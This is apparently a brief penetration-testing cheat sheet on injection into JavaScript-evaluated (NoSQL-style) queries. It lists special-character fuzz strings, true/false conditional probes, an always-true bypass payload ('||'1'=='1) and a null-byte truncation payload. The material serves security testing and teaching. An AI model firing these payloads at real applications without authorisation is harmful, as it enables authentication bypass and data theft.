#  Finding Vuln
During vulnerability discovery, special characters are used to test improper input validation.
```
'"`{ ;$Foo }
$Foo \xYZ
```
or 
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```
Note: Special characters may break the query, so they must be escaped using "\"
```
this.category == '\''
```

# Conditional behavior
Conditional logic can be tested to identify injection points.
False 
```
' && 0 && 'x
```
True
```
' && 1 && 'x
```

# Payload Conditional
This payload forces a condition that is always true.
```
'||'1'=='1
```
Using this payload, everything that follows is ignored:
```
'%00
```
